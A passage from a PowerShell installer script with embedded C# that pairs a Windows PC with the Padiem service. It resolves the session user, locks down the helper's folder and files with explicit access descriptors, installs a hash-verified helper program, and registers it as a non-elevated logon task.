    // an arbitrary user if more than one remote desktop is active.
    public static uint? SingleRdpSession(IEnumerable<uint> ids)
    {
        uint? selected = null;
        foreach (uint id in ids)
        {
            if (selected.HasValue)
                throw new InvalidOperationException("ambiguous_active_rdp");
            selected = id;
        }
        return selected;
    }

    public static string RdpUser()
    {
        IntPtr sessions;
        int count;
        if (!WTSEnumerateSessions(IntPtr.Zero, 0, 1, out sessions, out count))
            throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());
        try
        {
            List<uint> activeRdp = new List<uint>();
            int size = Marshal.SizeOf(typeof(SessionInfo));
            for (int i = 0; i < count; i++)
            {
                SessionInfo session = (SessionInfo)Marshal.PtrToStructure(
                    IntPtr.Add(sessions, checked(i * size)), typeof(SessionInfo));
                if (session.State != WTSActive || session.SessionId == 0) continue;
                short protocol = Query<short>(session.SessionId, WTSClientProtocolType,
                    delegate(IntPtr buffer, int bytes)
                    {
                        if (bytes < 2) throw new InvalidOperationException("invalid_wts_protocol");
                        return Marshal.ReadInt16(buffer);
                    });
                if (protocol == RdpProtocol) activeRdp.Add(session.SessionId);
            }
            uint? selected = SingleRdpSession(activeRdp);
            return selected.HasValue ? SessionUser(selected.Value) : null;
        }
        finally { WTSFreeMemory(sessions); }
    }

    public static string Resolve(Func<string> wmi, Func<string> console,
        Func<string> rdp, out string reason)
    {
        List<string> failures = new List<string>();
        Func<string>[] lookups = { wmi, console, rdp };
        string[] names = { "wmi", "wts_console", "wts_rdp" };
        for (int i = 0; i < lookups.Length; i++)
        {
            try
            {
                string user = lookups[i]();
                if (ValidName(user))
                {
                    reason = string.Join(";", failures.ToArray());
                    return user;
                }
                failures.Add(names[i] + "_no_user");
            }
            catch (Exception error)
            {
                // Type only: exception messages may contain account data.
                failures.Add(names[i] + "_failed:" + error.GetType().Name);
            }
        }
        reason = string.Join(";", failures.ToArray());
        return null;
    }
}
'@
    }
    $fallbackReason = ""
    $name = [PadiemSessionLookup]::Resolve(
      [Func[string]] { return $null },
      [Func[string]] { [PadiemSessionLookup]::ConsoleUser() },
      [Func[string]] { [PadiemSessionLookup]::RdpUser() },
      [ref] $fallbackReason)
    # The synthetic first lookup was already performed by Get-CimInstance.
    $Reason.Value += ($fallbackReason -replace '^wmi_no_user', '')
    return $name
  } catch {
    $Reason.Value += ";wts_failed:" + $_.Exception.GetType().Name
    return $null
  }
}

function Get-PadiemAccountSid {
  param([string] $Account)
  # The SID Windows resolves the account to. A name that does not resolve is
  # not an account this installer may grant anything to.
  try {
    $resolved = (New-Object System.Security.Principal.NTAccount($Account)).Translate([System.Security.Principal.SecurityIdentifier]).Value
    if ($resolved -match '^S-1-[0-9]+(-[0-9]+)+$') { return $resolved }
  } catch { }
  return $null
}

function Get-PadiemHelperDeviceId {
  param([string] $Tag)
  # The pairing tag is the identifier the server and this PC already share, so
  # it is the helper's device id by default. A tag that is not a safe raw id
  # gets a fresh 32-hex id; PR-3 reads whichever value this task carries out
  # of its own argument and derives the same pipe name from it.
  if ($Tag -and $Tag -match '^[A-Za-z0-9_.$:@+\-]{1,256}$') { return $Tag }
  return [guid]::NewGuid().ToString("N")
}

function Get-PadiemSha256 {
  param([string] $Path)
  $sha = [System.Security.Cryptography.SHA256]::Create()
  try {
    $stream = [System.IO.File]::OpenRead($Path)
    try {
      return ([BitConverter]::ToString($sha.ComputeHash($stream))).Replace("-", "").ToLowerInvariant()
    } finally { $stream.Dispose() }
  } finally { $sha.Dispose() }
}

function Get-PadiemHelperTrustedOwnerSids {
  # Whose folder this installer will work in: SYSTEM, the Administrators
  # group, and the administrator account running this very install - with
  # account control off, Windows records that account, not the group, as the
  # owner of what an administrator creates. A folder any other account made
  # first is never adopted.
  $trusted = @($PadiemHelperSystemSid, $PadiemHelperAdministratorsSid)
  try {
    $identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object System.Security.Principal.WindowsPrincipal($identity)
    if ($principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)) {
      $trusted += $identity.User.Value
    }
  } catch { }
  return $trusted
}

function Get-PadiemHelperSddl {
  param([string] $Kind, [string] $UserSid)
  # One descriptor per kind of object. "P" cuts inheritance. The folder's
  # entries carry OICI, so a file created inside starts from the same three
  # accounts. 0x1200a9 is read and execute (folder, program); 0x120089 is
  # read (secret, status). Without a user only SYSTEM and Administrators stay.
  $pattern = '^S-1-[0-9]+(-[0-9]+)+$'
  if ($PadiemHelperOwnerSid -notmatch $pattern) { throw "padiem_helper_owner_sid" }
  if ($UserSid -and ($UserSid -notmatch $pattern)) { throw "padiem_helper_user_sid" }
  $inherit = if ($Kind -eq "folder") { "OICI" } else { "" }
  $rights = if ($Kind -eq "data") { "0x120089" } else { "0x1200a9" }
  $sddl = "O:" + $PadiemHelperOwnerSid + "D:PAI(A;" + $inherit + ";FA;;;" + $PadiemHelperSystemSid + ")(A;" + $inherit + ";FA;;;" + $PadiemHelperAdministratorsSid + ")"
  if ($UserSid) { $sddl += "(A;" + $inherit + ";" + $rights + ";;;" + $UserSid + ")" }
  return $sddl
}

function New-PadiemHelperSecurity {
  param([string] $Kind, [string] $UserSid)
  # The descriptor as the object the file APIs take. Only the owner and the
  # access list are set, so applying it never asks for the audit privilege.
  $security = if ($Kind -eq "folder") { New-Object System.Security.AccessControl.DirectorySecurity } else { New-Object System.Security.AccessControl.FileSecurity }
  $sections = [System.Security.AccessControl.AccessControlSections]::Owner -bor [System.Security.AccessControl.AccessControlSections]::Access
  $security.SetSecurityDescriptorSddlForm((Get-PadiemHelperSddl -Kind $Kind -UserSid $UserSid), $sections)
  return $security
}

function Get-PadiemHelperSecurityFacts {
  param($Security)
  # Owner, whether inheritance is cut, and every entry: what it takes to say
  # two descriptors grant the same things to the same accounts.
  $sid = [System.Security.Principal.SecurityIdentifier]
  $rules = @($Security.GetAccessRules($true, $true, $sid) | ForEach-Object {
    "{0}/{1}/{2}/{3}/{4}/{5}" -f $_.IdentityReference.Value, [int] $_.AccessControlType, [int] $_.FileSystemRights, [int] $_.InheritanceFlags, [int] $_.PropagationFlags, [int] $_.IsInherited
  } | Sort-Object)
  return "{0};{1};{2}" -f $Security.GetOwner($sid).Value, [int] $Security.AreAccessRulesProtected, ($rules -join ",")
}

function Test-PadiemHelperSecurity {
  param([string] $Path, [string] $Kind, [string] $UserSid)
  # Reads back what the disk holds. That the call which set a descriptor did
  # not fail is not the fact; the descriptor that is there now is. A link is
  # never the object this installer made.
  try {
    $item = Get-Item -LiteralPath $Path -Force
    if (($item.Attributes -band [System.IO.FileAttributes]::ReparsePoint) -ne 0) { return $false }
    if ($item.PSIsContainer -ne ($Kind -eq "folder")) { return $false }
    $actual = if ($Kind -eq "folder") { [System.IO.Directory]::GetAccessControl($Path) } else { [System.IO.File]::GetAccessControl($Path) }
    $expected = New-PadiemHelperSecurity -Kind $Kind -UserSid $UserSid
    return ((Get-PadiemHelperSecurityFacts $actual) -eq (Get-PadiemHelperSecurityFacts $expected))
  } catch {
    return $false
  }
}

function Test-PadiemHelperFolderAdoptable {
  param([string] $Path)
  # "" when the folder that is already there may be worked in, otherwise why
  # not. It is adopted only from an owner this installer trusts, and never
  # when it is a link that leads somewhere else.
  $item = Get-Item -LiteralPath $Path -Force
  if (-not $item.PSIsContainer) { return "state_dir_not_a_folder" }
  if (($item.Attributes -band [System.IO.FileAttributes]::ReparsePoint) -ne 0) { return "state_dir_is_a_link" }
  $owner = $null
  try {
    $owner = [System.IO.Directory]::GetAccessControl($Path).GetOwner([System.Security.Principal.SecurityIdentifier]).Value
  } catch { $owner = $null }
  if (-not $owner -or (@(Get-PadiemHelperTrustedOwnerSids) -notcontains $owner)) { return "state_dir_owner_untrusted" }
  return ""
}

function Protect-PadiemHelperStateDir {
  param([string] $Path, [string] $UserSid)
  # "" when the folder is this installer's own and locked, otherwise the reason
  # it will not be used. A folder that is not there is created already carrying
  # its descriptor - there is no moment it exists with the inherited one. A
  # folder that is there is checked before it is touched, and what the disk
  # holds afterwards is read back either way.
  $security = New-PadiemHelperSecurity -Kind "folder" -UserSid $UserSid
  if (Test-Path -LiteralPath $Path) {
    $refusal = Test-PadiemHelperFolderAdoptable -Path $Path
    if ($refusal) { return $refusal }
    try { [System.IO.Directory]::SetAccessControl($Path, $security) } catch { return "state_dir_acl_failed" }
  } else {
    try { [void] [System.IO.Directory]::CreateDirectory($Path, $security) } catch { return "state_dir_create_failed" }
  }
  if (-not (Test-PadiemHelperSecurity -Path $Path -Kind "folder" -UserSid $UserSid)) { return "state_dir_acl_unverified" }
  return ""
}

function New-PadiemHelperLockedFile {
  param([string] $Path, [string] $Kind, [string] $UserSid)
  # A write stream on a file that is created already carrying its descriptor.
  # CreateNew refuses a name that exists, so a file somebody left there is
  # never written through.
  $security = New-PadiemHelperSecurity -Kind $Kind -UserSid $UserSid
  return New-Object System.IO.FileStream($Path, [System.IO.FileMode]::CreateNew, [System.Security.AccessControl.FileSystemRights]::Write, [System.IO.FileShare]::None, 4096, [System.IO.FileOptions]::None, $security)
}

function Move-PadiemHelperFileIntoPlace {
  param([string] $Source, [string] $Target)
  # A rename inside the locked folder keeps the descriptor the new file was
  # created with. The old file is removed first, not replaced in place:
  # replacing would hand the new bytes to whatever owner and entries the old
  # file had. A file that was just in use can stay held for a moment after its
  # process ends; three short waits is the whole retry.
  for ($attempt = 0; ; $attempt++) {
    try {
      if (Test-Path -LiteralPath $Target) {
        [System.IO.File]::SetAttributes($Target, [System.IO.FileAttributes]::Normal)
        [System.IO.File]::Delete($Target)
      }
      [System.IO.File]::Move($Source, $Target)
      return
    } catch {
      if ($attempt -ge 3) { throw }
      Start-Sleep -Milliseconds 500
    }
  }
}

function Copy-PadiemHelperProgram {
  param([string] $Source, [string] $Target, [string] $Sha256, [string] $UserSid)
  # The program is copied into a new file that already carries its descriptor,
  # hashed where it now lies, and only then given its name. True when the
  # bytes that were placed are the reviewed ones.
  $pending = $Target + "." + [guid]::NewGuid().ToString("N") + ".new"
  try {
    $writer = New-PadiemHelperLockedFile -Path $pending -Kind "program" -UserSid $UserSid
    try {
      $reader = [System.IO.File]::OpenRead($Source)
      try { $reader.CopyTo($writer) } finally { $reader.Dispose() }
    } finally { $writer.Dispose() }
    if ((Get-PadiemSha256 -Path $pending) -ne $Sha256) { return $false }
    Move-PadiemHelperFileIntoPlace -Source $pending -Target $Target
    return $true
  } finally {
    if (Test-Path -LiteralPath $pending) { Remove-Item -LiteralPath $pending -Force -ErrorAction SilentlyContinue }
  }
}

function New-PadiemHelperSecret {
  param([string] $Path, [string] $UserSid)
  # 32 random bytes, written as 64 lowercase hex characters - the shape the
  # Connector's own provisioning lane already writes. Every install makes a new
  # one: a file that is already there is never read back or kept, because
  # whoever wrote it knows what is in it. The new file carries its descriptor
  # from the moment it exists and gets its name only once it is complete. The
  # value stays in this process and on this file; it is never written to the
  # console or the status.
  $bytes = New-Object byte[] 32
  $random = [System.Security.Cryptography.RandomNumberGenerator]::Create()
  try { $random.GetBytes($bytes) } finally { $random.Dispose() }
  $hex = -join ($bytes | ForEach-Object { $_.ToString("x2") })
  $payload = (New-Object System.Text.UTF8Encoding($false)).GetBytes($hex + "`n")
  $pending = $Path + "." + [guid]::NewGuid().ToString("N") + ".new"
  try {
    $stream = New-PadiemHelperLockedFile -Path $pending -Kind "data" -UserSid $UserSid
    try { $stream.Write($payload, 0, $payload.Length) } finally { $stream.Dispose() }
    Move-PadiemHelperFileIntoPlace -Source $pending -Target $Path
  } finally {
    if (Test-Path -LiteralPath $pending) { Remove-Item -LiteralPath $pending -Force -ErrorAction SilentlyContinue }
  }
}

function Stop-PadiemUserHelper {
  param([string] $HelperExe)
  # A helper that is still running keeps the old secret in memory and its
  # program file open, so a re-install ends it first: the task instance, then
  # any process still running this exact file. True when none is left and the
  # task record no longer says "running" - a start that Windows still counts
  # as a second instance would be ignored.
  try {
    Stop-ScheduledTask -TaskName $PadiemUserHelperTaskName -TaskPath $PadiemUserHelperTaskFolder -ErrorAction SilentlyContinue
  } catch { }
  $name = [System.IO.Path]::GetFileNameWithoutExtension($HelperExe)
  for ($attempt = 0; $attempt -lt 40; $attempt++) {
    $running = @()
    foreach ($process in @(Get-Process -Name $name -ErrorAction SilentlyContinue)) {
      $image = $null
      try { $image = $process.MainModule.FileName } catch { $image = $null }
      if ($image -and [string]::Equals($image, $HelperExe, [System.StringComparison]::OrdinalIgnoreCase)) { $running += $process }
    }
    if ($running.Count -eq 0) {
      $task = $null
      try {
        $task = Get-ScheduledTask -TaskName $PadiemUserHelperTaskName -TaskPath $PadiemUserHelperTaskFolder -ErrorAction SilentlyContinue
      } catch { $task = $null }
      if (-not $task -or ([string] $task.State -ne "Running")) { return $true }
    }
    foreach ($process in $running) { try { $process.Kill() } catch { } }
    Start-Sleep -Milliseconds 250
  }
  return $false
}

function Move-PadiemHelperForeignContent {
  param([string] $StateDir)
  # Once the folder is locked, only plain files owned by SYSTEM or an
  # administrator stay in it. Anything else - a file another account put there
  # while the folder was open to it, a subfolder, a link - is moved, by one
  # rename each and never by a walk through its contents, into a sibling
  # folder only SYSTEM and administrators can open. True when nothing of the
  # kind is left.
  $trusted = @(Get-PadiemHelperTrustedOwnerSids)
  $foreign = @()
  foreach ($child in @(Get-ChildItem -LiteralPath $StateDir -Force)) {
    $owner = $null
    if (-not $child.PSIsContainer -and (($child.Attributes -band [System.IO.FileAttributes]::ReparsePoint) -eq 0)) {
      try {
        $owner = [System.IO.File]::GetAccessControl($child.FullName).GetOwner([System.Security.Principal.SecurityIdentifier]).Value
      } catch { $owner = $null }
    }
    if (-not $owner -or ($trusted -notcontains $owner)) { $foreign += $child }
  }
  if ($foreign.Count -eq 0) { return $true }
  $stamp = [DateTime]::UtcNow.ToString("yyyyMMddHHmmss", [System.Globalization.CultureInfo]::InvariantCulture)
  $quarantine = $StateDir.TrimEnd('\') + ".quarantine-" + $stamp + "-" + [guid]::NewGuid().ToString("N").Substring(0, 8)
  [void] [System.IO.Directory]::CreateDirectory($quarantine, (New-PadiemHelperSecurity -Kind "folder" -UserSid $null))
  if (-not (Test-PadiemHelperSecurity -Path $quarantine -Kind "folder" -UserSid $null)) { return $false }
  $moved = 0
  foreach ($child in $foreign) {
    try {
      $destination = Join-Path $quarantine $child.Name
      if ($child.PSIsContainer) {
        [System.IO.Directory]::Move($child.FullName, $destination)
      } else {
        [System.IO.File]::Move($child.FullName, $destination)
      }
      $moved++
    } catch { }
  }
  Write-Host ("도우미 설치 폴더에 있던, 관리자나 SYSTEM 소유가 아닌 항목 " + $moved + "개를 " + $quarantine + " 폴더로 옮겼습니다.")
  return ($moved -eq $foreign.Count)
}

function Get-PadiemHelperInstallFault {
  param([string] $UserSid)
  # Reads the finished install back before the helper is allowed to start from
  # it. "" when the folder, the program and the secret each carry exactly
  # their own descriptor.
  if (-not (Test-PadiemHelperSecurity -Path $PadiemUserHelperStateDir -Kind "folder" -UserSid $UserSid)) { return "state_dir_acl_unverified" }
  if (-not (Test-PadiemHelperSecurity -Path $PadiemUserHelperExe -Kind "program" -UserSid $UserSid)) { return "program_acl_unverified" }
  if (-not (Test-PadiemHelperSecurity -Path $PadiemUserHelperSecret -Kind "data" -UserSid $UserSid)) { return "secret_acl_failed" }
  return ""
}

function Write-PadiemHelperStatus {
  param([hashtable] $Status, [string] $UserSid)
  # Local evidence only. The secret is never a member of this hashtable. The
  # status is written only into a folder this installer would adopt, as a new
  # file that already carries its descriptor and is then renamed into place -
  # never through a file that was already lying there, and with the writer
  # instead of the cmdlets the wrapper bans for pairing data.
  if (-not $PadiemUserHelperStatus) { return }
  $pending = $null
  try {
    if (-not (Test-Path -LiteralPath $PadiemUserHelperStateDir)) { return }
    if (Test-PadiemHelperFolderAdoptable -Path $PadiemUserHelperStateDir) { return }
    $json = $Status | ConvertTo-Json -Compress
    $payload = (New-Object System.Text.UTF8Encoding($false)).GetBytes($json + "`n")
    $pending = $PadiemUserHelperStatus + "." + [guid]::NewGuid().ToString("N") + ".new"
    $stream = New-PadiemHelperLockedFile -Path $pending -Kind "data" -UserSid $UserSid
    try { $stream.Write($payload, 0, $payload.Length) } finally { $stream.Dispose() }
    Move-PadiemHelperFileIntoPlace -Source $pending -Target $PadiemUserHelperStatus
  } catch {
  } finally {
    if ($pending -and (Test-Path -LiteralPath $pending)) { Remove-Item -LiteralPath $pending -Force -ErrorAction SilentlyContinue }
  }
}

function Write-PadiemHelperFailure {
  param([hashtable] $Status, [string] $UserSid)
  # An install that stops says why: on the console, and - when the folder is
  # one this installer may write in - in helper-status.json. The reason is a
  # fixed code; no pairing value is ever part of it.
  Write-PadiemHelperStatus -Status $Status -UserSid $UserSid
  $reason = [string] $Status["reason"]
  if ($reason -eq "state_dir_owner_untrusted") {
    Write-Host ("도우미 설치 폴더 " + $PadiemUserHelperStateDir + " 의 소유자가 관리자나 SYSTEM이 아니어서, 그 폴더를 쓰지 않고 도우미 설치를 멈췄습니다. 관리자가 폴더를 확인해 지운 뒤 다시 설치해 주세요.")
  }
  Write-Host ("사용자 세션 도우미 설치를 멈춘 이유: " + $reason)
}

function Register-PadiemUserHelperTask {
  param([string] $HelperExe, [string] $SecretPath, [string] $DeviceId, [string] $ConsoleUser)
  # ONLOGON, Interactive, Limited: the helper starts in the console user's own
  # session and never runs elevated. Registering for that user from this
  # already-elevated process does not ask Windows for another approval.
  $arguments = '--device-id "' + $DeviceId + '" --secret-file "' + $SecretPath + '"'
  $action = New-ScheduledTaskAction -Execute $HelperExe -Argument $arguments -WorkingDirectory $PadiemUserHelperStateDir
  $trigger = New-ScheduledTaskTrigger -AtLogOn -User $ConsoleUser
  $principal = New-ScheduledTaskPrincipal -UserId $ConsoleUser -LogonType Interactive -RunLevel Limited
  $settings = New-ScheduledTaskSettingsSet -MultipleInstances IgnoreNew -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
  Register-ScheduledTask -TaskName $PadiemUserHelperTaskName -TaskPath $PadiemUserHelperTaskFolder -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description "PADIEM user-session helper (#7108). One request per process." -Force | Out-Null
  Start-ScheduledTask -TaskName $PadiemUserHelperTaskName -TaskPath $PadiemUserHelperTaskFolder
  return $true
}

function Install-PadiemUserHelper {
  # Lock the folder, download, verify, end a running helper, clear what does
  # not belong, place, new secret, read the install back, logon task, status:
  # the same order in both PowerShell lanes and the double-click program.
  # Every failure returns false after saying its reason; nothing here throws
  # into the caller.
  param([string] $Url, [string] $Sha256, [string] $DeviceId)
  $status = @{ status = "not_installed"; task = $PadiemUserHelperTaskName; device_id = $DeviceId }
  if (-not $Url -or -not $Sha256) { return $false }
  if (-not $PadiemUserHelperStateDir) {
    $status.reason = "state_dir_missing"
    Write-PadiemHelperFailure -Status $status -UserSid $null
    return $false
  }
  $temp = $null
  $userSid = $null
  $stopped = $false
  $verified = $false
  try {
    $lookupReason = ""
    $consoleUser = Get-PadiemConsoleUser -Reason ([ref] $lookupReason)
    if ($consoleUser) { $userSid = Get-PadiemAccountSid -Account $consoleUser }
    if (-not $userSid) {
      $status.reason = if ($consoleUser) { "console_user_unresolved" } else { "no_console_user;" + $lookupReason }
      Write-PadiemHelperFailure -Status $status -UserSid $null
      return $false
    }
    # Nothing is downloaded, stopped or written until the folder is this
    # installer's own: a folder another account made first is refused here,
    # before anything on this PC has changed.
    $refusal = Protect-PadiemHelperStateDir -Path $PadiemUserHelperStateDir -UserSid $userSid
    if ($refusal) {
      $status.reason = $refusal
      Write-PadiemHelperFailure -Status $status -UserSid $userSid
      return $false
    }
    $temp = Join-Path $env:TEMP ("padiem-user-helper-" + [guid]::NewGuid().ToString("N") + ".exe")
    Invoke-WebRequest -Uri $Url -OutFile $temp -UseBasicParsing -TimeoutSec 180
    $expected = $Sha256.ToLowerInvariant()
    $actual = Get-PadiemSha256 -Path $temp
    if ($actual -ne $expected) {
      $status.reason = "sha256_mismatch"
      Write-PadiemHelperFailure -Status $status -UserSid $userSid
      return $false
    }
    if (-not (Stop-PadiemUserHelper -HelperExe $PadiemUserHelperExe)) {
      $status.reason = "helper_still_running"
      Write-PadiemHelperFailure -Status $status -UserSid $userSid
      return $false
    }
    $stopped = $true
    if (-not (Move-PadiemHelperForeignContent -StateDir $PadiemUserHelperStateDir)) {
      $status.reason = "state_dir_foreign_content"
      Write-PadiemHelperFailure -Status $status -UserSid $userSid
      return $false
    }
    if (-not (Copy-PadiemHelperProgram -Source $temp -Target $PadiemUserHelperExe -Sha256 $expected -UserSid $userSid)) {
      $status.reason = "sha256_mismatch"
      Write-PadiemHelperFailure -Status $status -UserSid $userSid
      return $false
    }
    New-PadiemHelperSecret -Path $PadiemUserHelperSecret -UserSid $userSid
    $fault = Get-PadiemHelperInstallFault -UserSid $userSid
    if ($fault) {
      $status.reason = $fault
      Write-PadiemHelperFailure -Status $status -UserSid $userSid
      return $false
    }
    $verified = $true
    if (-not (Register-PadiemUserHelperTask -HelperExe $PadiemUserHelperExe -SecretPath $PadiemUserHelperSecret -DeviceId $DeviceId -ConsoleUser $consoleUser)) {
      $status.reason = "task_registration_failed"
      Write-PadiemHelperFailure -Status $status -UserSid $userSid
      return $false
    }
    $status.status = "installed"
    $status.sha256 = $expected
    # Only an immutable release path supplies a version. Its verified digest
    # above binds the version to the installed bytes.
    if ($Url -match '^https://downloads\.padiem\.net/pc-helper/([0-9]{1,5}\.[0-9]{1,5}\.[0-9]{1,5}(?:-rc[0-9]{1,5})?)/padiem-user-helper\.exe$') {
      $status.version = $Matches[1]
    }
    $status.user = $consoleUser
    if ($lookupReason) { $status.reason = $lookupReason }
    Write-PadiemHelperStatus -Status $status -UserSid $userSid
    try {
      if (-not $status.ContainsKey("version")) { throw "version_unavailable" }
      Register-PadiemHelperUpdater
    } catch {
      # Report only a bounded code, never an exception containing device data.
      $status.update_result = "registration_failed"
      $reason = [string] $_.Exception.Message
      $status.update_registration_error = if ($reason -in @("updater_running", "missing_fixed_source", "invalid_install_record", "installed_digest_mismatch", "version_unavailable")) { $reason } else { "task_registration_failed" }
      $registrationReason = "update_registration_failed:" + $status.update_registration_error
      $status.reason = if ($status.ContainsKey("reason") -and $status.reason) { $status.reason + ";" + $registrationReason } else { $registrationReason }
      Write-PadiemHelperStatus -Status $status -UserSid $userSid
      Write-Host ("자동 업데이트 작업 등록 실패: " + $status.update_registration_error)
    }
    return $true
  } catch {
    $status.status = "not_installed"
    $status.reason = "provision_failed"
    $status.error = $_.Exception.GetType().Name
    Write-PadiemHelperFailure -Status $status -UserSid $userSid
    return $false
  } finally {
    if ($temp) { Remove-Item -LiteralPath $temp -Force -ErrorAction SilentlyContinue }
    if ($stopped -and -not $verified) {
      # The old helper was ended and the new install did not pass its
      # read-back. Without a secret the helper refuses to start, so a folder
      # that was not verified is never served from.
      Remove-Item -LiteralPath $PadiemUserHelperSecret -Force -ErrorAction SilentlyContinue
    }
  }
}

function Format-PadiemCode {
  param([string] $Value)
  # Codes are issued from an unambiguous alphabet; accept the code whether the
  # human typed it lower-case, upper-case or with a stray space.
  if ($null -eq $Value) { return $null }
  $trimmed = ($Value -replace '\s', '').ToUpperInvariant()
  if ($trimmed -notmatch '^[23456789ABCDEFGHJKLMNPQRSTUVWXYZ]{12}$') { return $null }
  return $trimmed
}

function Get-PadiemOrigin {
  param([string] $Value)
  # A plain https origin with a host and nothing else: no credentials, no path,
  # no port tricks. The installer is fetched from this origin, so an http hop or
  # a caller-supplied path is refused the same way the server-side validator
  # refuses it - as no configuration at all.
  if ($null -eq $Value) { return $null }
  $origin = $Value.Trim().TrimEnd('/')
  if ($origin -match '@') { return $null }
  if ($origin -notmatch '^https://[A-Za-z0-9.-]+(:[0-9]{1,5})?$') { return $null }
  return $origin
}

function Test-PadiemAgentInstalled {
  param([string] $Directory)
  if ([string]::IsNullOrWhiteSpace($Directory)) { return $false }
  if (-not (Test-Path -LiteralPath $Directory -PathType Container)) { return $false }
  return (@(Get-ChildItem -LiteralPath $Directory -Filter '*.exe' -ErrorAction SilentlyContinue).Count -gt 0)
}

function Invoke-PadiemHandoff {
  param([string] $Origin, [string] $PairingCode)
  $body = @{ code = $PairingCode } | ConvertTo-Json -Compress
  try {
    return Invoke-RestMethod -Method Post -Uri ($Origin + $HandoffPath) `
      -ContentType 'application/json' -Body $body -TimeoutSec 30
  } catch {
    return $null
  }
}

function Get-PadiemDriveRoots {
  # A linked PC works over its whole local drives by default (#5573, Owner
  # decision), so the PC names the fixed drives it actually has. Network drives
  # carry a DisplayRoot and stay out of the grants. A failed query reports
  # nothing at all: the server then says the drive lookup failed instead of
  # guessing a scope.
  try {
    return @(Get-PSDrive -PSProvider FileSystem -ErrorAction Stop |
      Where-Object { $null -eq $_.DisplayRoot } |
      ForEach-Object { $_.Name.ToUpperInvariant() + ':' } | Sort-Object -Unique)
  } catch {
    return @()
  }
}

function Get-PadiemShareCandidates {
  # #8036: a mapped drive or a shared folder is only a CANDIDATE. Its real UNC
  # address is reported so an administrator can approve that one share unit;
  # nothing here grants access and no credential is ever part of this value.
  try {
    return @(Get-PSDrive -PSProvider FileSystem -ErrorAction Stop |
      Where-Object { $null -ne $_.DisplayRoot -and $_.DisplayRoot -match '^\\\\[^\\]+\\[^\\]+' } |
      Select-Object -First 8 |
      ForEach-Object {
        $root = '//' + $_.DisplayRoot.TrimStart('\').Replace('\', '/')
        $_.Name.ToUpperInvariant() + ':=' + $root
      } | Sort-Object -Unique)
  } catch {
    return @()
  }
}

function Invoke-PadiemUserHelperInstall {
  param([string] $Url, [string] $Sha256, [string] $Tag)
  # Optional and best-effort: an unconfigured deployment says nothing, and a
  # configured one says which of the two happened without changing the exit code.
  # Defined with the other functions, before the $installed branch that can call it.
  if (-not $Url -or -not $Sha256) { return }
  try {
    $deviceId = Get-PadiemHelperDeviceId -Tag $Tag
    if (Install-PadiemUserHelper -Url $Url -Sha256 $Sha256 -DeviceId $deviceId) {
      Write-Host $Copy.HelperInstalled
    } else {
      Write-Host $Copy.HelperUnavailable
    }
  } catch {
    Write-Host $Copy.HelperUnavailable
  }
}

function Read-PadiemCode {
  # Read-Host -AsSecureString keeps the typed proof off the console and off the
  # command line; it is converted here and never leaves this scope.
  $secure = Read-Host -Prompt $Copy.Prompt -AsSecureString
  $bstr = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($secure)
  try { return [Runtime.InteropServices.Marshal]::PtrToStringBSTR($bstr) }
  finally { [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr) }
}

function Save-PadiemInstaller {
  param([string] $Url)
  # The installer itself is downloaded to a temp path and removed after the
  # attempt, so the pairing information never persists in a file. The service
  # sequence that follows runs the durable copy, never this one.
  $target = Join-Path $env:TEMP ("padiem-agent-" + [guid]::NewGuid().ToString('N') + ".exe")
  Invoke-WebRequest -Uri $Url -OutFile $target -UseBasicParsing -TimeoutSec 120
  return $target
}

function Test-PadiemAdministrator {
  $identity = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
  return $identity.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Assert-PadiemElevation {
  # The copy into Program Files and the service work below need the
  # administrator token, and one approval covers the whole sequence - the same
  # single prompt the double-click program asks for before it connects. The
  # origin (and a caller-supplied check code) travel into the elevated console;
  # a typed code never does, because a command line is not where it belongs.
  if (Test-PadiemAdministrator) { return }
  Write-Host $Copy.ElevationNeeded
  $arguments = @("-NoProfile", "-ExecutionPolicy", "Bypass", "-File", ('"' + $PSCommandPath + '"'))
  if ($ChatOrigin) { $arguments += @("-ChatOrigin", $ChatOrigin) }
  if ($Code) { $arguments += @("-Code", $Code) }
  try {
    Start-Process -FilePath "powershell.exe" -ArgumentList $arguments -Verb RunAs
  } catch [System.ComponentModel.Win32Exception] {
    Write-Error $Copy.ElevationRefused
    exit 5
  } catch {
    Write-Error $Copy.ElevationFailed
    exit 6
  }
  exit 0
}

$origin = Get-PadiemOrigin -Value $ChatOrigin
if (-not $origin) { Write-Error $Copy.BadOrigin; exit 2 }

# A command-line code is the automated check's input, and a badly shaped one is
# refused before anything asks for elevation: a broken check run never prompts.
if (-not [string]::IsNullOrWhiteSpace($Code) -and -not (Format-PadiemCode -Value $Code)) {
  Write-Error $Copy.BadCode
  exit 2
}

if (-not $DryRun) { Assert-PadiemElevation }

$rawCode = if ([string]::IsNullOrWhiteSpace($Code)) { Read-PadiemCode } else { $Code }
$pairingCode = Format-PadiemCode -Value $rawCode
if (-not $pairingCode) { Write-Error $Copy.BadCode; exit 2 }

$handoff = Invoke-PadiemHandoff -Origin $origin -PairingCode $pairingCode
if (-not $handoff -or -not $handoff.handoff) { Write-Error $Copy.NotReady; exit 3 }
$agentUrl = [string] $handoff.handoff.agent_url
$tag = [string] $handoff.handoff.install_tag
$helperUrl = [string] $handoff.handoff.user_helper_url
$helperSha = [string] $handoff.handoff.user_helper_sha256
$installed = Test-PadiemAgentInstalled -Directory $AgentInstallDir

if (-not $agentUrl -and -not $installed) {
  # The code is still good and the tag was issued; only the download target is
  # not configured yet. Saying so is the whole answer - an already installed PC
  # continues below without ever needing a link.
  Write-Host $Copy.LinkPending
  exit 0
}

if ($installed) {
  # The agent already exists: the renewal walk below updates the one service
  # in place with the new tag in the agent name, the same walk the card
  # install file and the double-click program run. The observation lane
  # finishes the pairing from that name - the code is consumed and the link
  # activated server-side, so no claim and no node id typed by anyone is
  # needed here (R3: a PC added to another account, or re-paired after a
  # revoke, renews instead of submitting a claim).
  Write-Host $Copy.Renewing
}

if (-not $agentUrl) {
  # An already installed PC without a download target: this deployment has no
  # installer link configured, so a renewal cannot run. Nothing was consumed
  # and nothing on this PC changed.
  Write-Host $Copy.RenewalLinkMissing
  exit 0
}

function Format-PadiemAgentName {
